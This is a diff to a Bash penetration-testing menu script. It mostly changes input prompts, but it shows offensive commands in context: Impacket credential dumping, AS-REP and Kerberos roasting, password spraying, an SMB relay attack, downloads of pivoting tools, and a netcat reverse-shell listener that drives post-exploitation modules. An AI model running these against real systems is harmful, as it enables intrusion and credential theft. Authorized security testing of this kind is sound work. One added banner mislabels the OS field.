@@ -1350,7 +1350,7 @@ osint_spiderfoot() {
     echo -e "30) sfp_virustotal            - Obtain information from VirusTotal about identified IP addresses."
     echo -e "31) Enter other module manually"
 
-    read -p "Option: " spiderfoot_option
+    read -e -p "Option: " spiderfoot_option
     clear
     case $spiderfoot_option in
         1) module="sfp_abstractapi" ;;
@@ -1552,7 +1552,7 @@ download_tools() {
     echo -e "4) WinPEAS"
     echo -e "5) LinPEAS"
     echo -e "6) Back to Main Menu"
-    read -p "Enter your choice: " tool_choice
+    read -e -p "Enter your choice: " tool_choice
     clear
 
     case $tool_choice in
@@ -1561,7 +1561,7 @@ download_tools() {
             echo -e "1) Linux latest"
             echo -e "2) Windows V1.7.3"
             echo -e "3) Back to Main Menu"
-            read -p "Enter your choice: " socat_version
+            read -e -p "Enter your choice: " socat_version
             case $socat_version in
                 1) 
                     wget -P "$BASE_DIR/tools" "https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat"
@@ -1589,7 +1589,7 @@ download_tools() {
             echo -e "3) Windows V1.9.1"
             echo -e "4) Windows V1.7.3"
             echo -e "5) Back to Main Menu"
-            read -p "Enter your choice: " chisel_version
+            read -e -p "Enter your choice: " chisel_version
             case $chisel_version in
                 1) 
                     wget -P "$BASE_DIR/tools" "https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz"
@@ -1863,7 +1863,7 @@ osint_nuclei() {
 check_port_445() {
     if [[ ! $OPEN_PORTS =~ "445" ]]; then
         echo -e "${YELLOW}[!] Warning: Port 445 is not detected as open.${NC}"
-        read -p "Do you want to continue? (y/n): " choice
+        read -e -p "Do you want to continue? (y/n): " choice
         if [[ $choice != "y" && $choice != "Y" ]]; then
             return 1
         fi
@@ -1893,7 +1893,7 @@ show_ad_tools() {
         echo -e "11) SMB Relay Attack"
         echo -e "12) LDAP Enumeration"
         echo -e "13) Back to Main Menu"
-        read -p "Select an option: " ad_option
+        read -e -p "Select an option: " ad_option
 
         case $ad_option in
             1) run_bloodhound ;;
@@ -1924,15 +1924,15 @@ run_bloodhound() {
 
 # Function to run ldapsearch
 run_ldapsearch() {
-    read -p "Enter LDAP server address: " ldap_server
-    read -p "Enter search base (e.g., dc=example,dc=com): " search_base
+    read -e -p "Enter LDAP server address: " ldap_server
+    read -e -p "Enter search base (e.g., dc=example,dc=com): " search_base
     echo -e "${BLUE}[+] Running ldapsearch...${NC}"
     ldapsearch -x -H ldap://$ldap_server -b $search_base
 }
 
 # Function to run enum4linux
 run_enum4linux() {
-    read -p "Enter target IP: " target_ip
+    read -e -p "Enter target IP: " target_ip
     echo -e "${BLUE}[+] Running enum4linux...${NC}"
     enum4linux -a $target_ip
 }
@@ -1944,32 +1944,32 @@ run_impacket() {
     echo -e "2) GetUserSPNs"
     echo -e "3) SecretsDump"
     echo -e "4) SMBClient"
-    read -p "Select an Impacket tool: " impacket_option
+    read -e -p "Select an Impacket tool: " impacket_option
 
     case $impacket_option in
         1)
-            read -p "Enter target IP: " target_ip
-            read -p "Enter domain name: " domain
-            read -p "Enter username: " username
+            read -e -p "Enter target IP: " target_ip
+            read -e -p "Enter domain name: " domain
+            read -e -p "Enter username: " username
             GetNPUsers.py $domain/$username -no-pass -dc-ip $target_ip
             ;;
         2)
-            read -p "Enter target IP: " target_ip
-            read -p "Enter domain name: " domain
-            read -p "Enter username: " username
+            read -e -p "Enter target IP: " target_ip
+            read -e -p "Enter domain name: " domain
+            read -e -p "Enter username: " username
             GetUserSPNs.py $domain/$username -dc-ip $target_ip
             ;;
         3)
-            read -p "Enter target IP: " target_ip
-            read -p "Enter domain name: " domain
-            read -p "Enter username: " username
+            read -e -p "Enter target IP: " target_ip
+            read -e -p "Enter domain name: " domain
+            read -e -p "Enter username: " username
             read -s -p "Enter password: " password
             secretsdump.py $domain/$username:$password@$target_ip
             ;;
         4)
-            read -p "Enter target IP: " target_ip
-            read -p "Enter domain name: " domain
-            read -p "Enter username: " username
+            read -e -p "Enter target IP: " target_ip
+            read -e -p "Enter domain name: " domain
+            read -e -p "Enter username: " username
             read -s -p "Enter password: " password
             smbclient.py $domain/$username:$password@$target_ip
             ;;
@@ -1981,44 +1981,44 @@ run_impacket() {
 
 # Function to run CrackMapExec
 run_cme() {
-    read -p "Enter target IP: " target_ip
+    read -e -p "Enter target IP: " target_ip
     echo -e "${BLUE}[+] Running CrackMapExec...${NC}"
     crackmapexec smb $target_ip
 }
 
 # Function for SMB Enumeration
 smb_enumeration() {
-    read -p "Enter target IP: " target_ip
+    read -e -p "Enter target IP: " target_ip
     echo -e "${BLUE}[+] Running SMB Enumeration...${NC}"
     smbclient -L \\$target_ip -N
 }
 
 # Function for Kerberos Enumeration
 kerberos_enumeration() {
-    read -p "Enter target IP: " target_ip
+    read -e -p "Enter target IP: " target_ip
     echo -e "${BLUE}[+] Running Kerberos Enumeration...${NC}"
     nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='YOUR_REALM' $target_ip
 }
 
 # Function for DNS Enumeration
 dns_enumeration() {
-    read -p "Enter domain: " domain
+    read -e -p "Enter domain: " domain
     echo -e "${BLUE}[+] Running DNS Enumeration...${NC}"
     dnsrecon -d $domain
 }
 
 # Function for AS-REP Roasting
 asrep_roasting() {
-    read -p "Enter domain: " domain
+    read -e -p "Enter domain: " domain
     echo -e "${BLUE}[+] Running AS-REP Roasting...${NC}"
     GetNPUsers.py -dc-ip $target_ip -no-pass $domain/
 }
 
 # Function for Password Spraying
 password_spraying() {
-    read -p "Enter target IP: " target_ip
-    read -p "Enter domain: " domain
-    read -p "Enter username list file: " user_list
+    read -e -p "Enter target IP: " target_ip
+    read -e -p "Enter domain: " domain
+    read -e -p "Enter username list file: " user_list
     read -s -p "Enter password: " password
     echo -e "\n${BLUE}[+] Running Password Spraying...${NC}"
     crackmapexec smb $target_ip -u $user_list -p $password
@@ -2026,14 +2026,14 @@ password_spraying() {
 
 # Function for SMB Relay Attack
 smb_relay() {
-    read -p "Enter target IP: " target_ip
+    read -e -p "Enter target IP: " target_ip
     echo -e "${BLUE}[+] Running SMB Relay Attack...${NC}"
     ntlmrelayx.py -smb2support -t $target_ip
 }
 
 # Function for LDAP Enumeration
 ldap_enumeration() {
-    read -p "Enter LDAP server address: " ldap_server
+    read -e -p "Enter LDAP server address: " ldap_server
     echo -e "${BLUE}[+] Running LDAP Enumeration...${NC}"
     ldapsearch -x -H ldap://$ldap_server -b "dc=example,dc=com"
 }
@@ -2041,15 +2041,18 @@ ldap_enumeration() {
 # Function to handle post-exploitation tasks
 post_exploitation() {
     echo -e "${BLUE}[+] Post-Exploitation Menu:${NC}"
-    read -p "Enter the port to listen on: " listen_port
+    read -e -p "Enter the port to listen on: " listen_port
     echo -e "${BLUE}Setting up Netcat listener on port $listen_port...${NC}"
 
     # Create a new tmux session for the Netcat listener
     tmux new-session -d -s nc_listener "nc -lvnp $listen_port"
 
-    echo -e "${GREEN}[+] Reverse shell obtained. Select a post-exploitation option:${NC}"
-    read -p "Is the shell Linux or Windows? (l/w): " shell_type
+    echo -e "${GREEN}[+] Ejecute el comando para obtener la reverse shell... ${NC}"
+    echo
+    echo -e "${YELLOW}[+] Select a post-exploitation option: ${NC}"
+    read -e -p "Is the shell Linux or Windows? (l/w): " shell_type
     while true; do
+        echo -e "${BLUE}[+] Select a post-exploitation module: ${NC}"
         echo -e "1) Gather System Information"
         echo -e "2) Enumerate Users and Groups"
         echo -e "3) Check for Sudo Permissions"
@@ -2076,7 +2079,7 @@ post_exploitation() {
         echo -e "24) List Open Files"
         echo -e "25) Enumerate Installed Services"
         echo -e "26) Back to Main Menu"
-        read -p "Select an option: " post_option
+        read -e -p "Select an option: " post_option
 
         if [ "$shell_type" == "l" ]; then
             case $post_option in
@@ -2141,8 +2144,12 @@ post_exploitation() {
         else
             echo -e "${RED}Invalid shell type. Please enter 'l' for Linux or 'w' for Windows.${NC}"
         fi
-        
+
         # Display the output from the reverse shell
+        echo -e "${VIOLET}\n\n\n=========================================================================="
+        echo -e "================== ${YELLOW}Used module: ($post_option) - OS: ($post_option)${VIOLET}=================="
+        echo -e "==========================================================================${NC}"
+        echo
         tmux capture-pane -pt nc_listener -S -1000
         tmux show-buffer
         tmux delete-buffer
